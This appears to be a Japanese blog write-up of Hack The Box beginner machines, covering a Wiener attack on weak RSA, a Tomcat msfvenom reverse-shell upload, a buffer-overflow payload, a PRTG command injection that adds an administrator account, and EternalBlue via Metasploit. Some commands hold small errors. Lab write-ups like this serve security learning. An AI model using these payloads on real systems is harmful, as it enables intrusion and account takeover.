---
title: "HTB: Beginner"
date: 2024-05-24T21:22:04+09:00
draft: false
---

HTB, しばらくやってなかったらアカウント忘れてしまった

新しくアカウントを作って starting point も終えたので，やっていきたい

## Weak RSA

```python
from Crypto.PublicKey import RSA

pubkey = RSA.importKey(open("key.pub").read())
e = pubkey.e
n = pubkey.n

print("e :", e)
print("n :", n)
```

これで e, n を計算する．
e が巨大なので以下のように攻撃する

```python
import owiener
from Crypto.Util.number import *

e = 68180928631284147212820507192605734632035524131139938618069575375591806315288775310503696874509130847529572462608728019290710149661300246138036579342079580434777344111245495187927881132138357958744974243365962204835089753987667395511682829391276714359582055290140617797814443530797154040685978229936907206605
n = 573177824579630911668469272712547865443556654086190104722795509756891670023259031275433509121481030331598569379383505928315495462888788593695945321417676298471525243254143375622365552296949413920679290535717172319562064308937342567483690486592868352763021360051776130919666984258847567032959931761686072492923

d = owiener.attack(e, n)

if d is None:
    print("Failed")
else:
    print("d={}".format(d))
    
with open('flag.enc', 'rb') as ct:
    sc = bytes_to_long(ct.read())

plain = pow(c, d, n)
print(long_to_bytes(plain).strip())
```

## Jerry

- nmap: http-proxy 8080
- ip:8080 にアクセスする
- tomcat が開いている
  - /manager/html が管理画面っぽい
  - デフォルトパスワードをブルートフォースすると tomcat:s3cret で通る
  - .war ファイルをアップロードできる
  - ```msfvenom -p java/jsp_shell_reverse_tcp LHOST=<LHOST_IP> LPORT=<LHOST_IP> -f war -o revshell.war``` でリバースシェルファイルを生成
  - ```/revshell/``` にアクセス
- nc で待ち構えるとシェルが開く
  - Users/Administrator/Desktop
  - ```type *```
  - user, root どちらも書いてある

## You know 0xDiablos

- checksec は全部無効
- ghidra でデコンパイルする

```C
void vuln(void)
{
  char local_bc [180];
  
  gets(local_bc);
  puts(local_bc);
  return;
}

{
  char local_50 [64];
  FILE *local_10;
  
  local_10 = fopen("flag.txt","r");
  if (local_10 != (FILE *)0x0) {
    fgets(local_50,0x40,local_10);
    if ((param_1 == -0x21524111) && (param_2 == -0x3f212ff3)) {
      printf(local_50);
    }
    return;
  }
  puts("Hurry up and try in on server side.");
                    /* WARNING: Subroutine does not return */
  exit(0);
}
```

- PIE(次に実行する関数のアドレス) オフセットは 188
  - ```pattern_offset 0x41417741```
  - ```python3 -c "import sys; sys.stdout.buffer.write(b'A'*188+b'\xe2\x91\x04\x08')"  > exploit.txt```
  - ```r < exploti.txt```
  - EIP の次に引数があるので，flag 関数の中身に必要な引数を追加する
  - ```python3 -c "import sys; sys.stdout.buffer.write(b'A'*188+b'\xe2\x91\x04\x08'+b'DUMB\xef\xbe\xad\xde\x0d\xd0\xde\xc0')"  > exploit.txt```

## Netmon

- nmap
  - ftp が anonymous ログイン
  - PRTG netowork monitor が動いている
  - バックアップデータを取り出すと，ユーザ名とパスワードが手に入る
- 管理画面ログイン
  - さっきのパスワードを少しずつ変えてログインする
  - このバージョンに RCE の脆弱性がある
  - ```abc.txt | net user htb abc123! /add ; net localgroup administrators htb /add```
  - これをトリガーする
    - このトリガー方法を調べるので 500 年使った
  - ```psexec.py htb:'abc123!'@ip```

## BLUE

- nmap
  - -sCV で hostname が見える
  - Windows 7 が動いている
- ```smbclient``` で SMB シェアの詳細を見れる
- MS17-101 の脆弱性を使う
  - Wanna Cry
- metasploit でやっていく
  - ```search MS17-101```
  - ```use 0```
  - RHOSTS, LHOST を設定する
  - ```run```
  - 内部に入れるので，シェルを起動する ```shell```
  - flag を取る
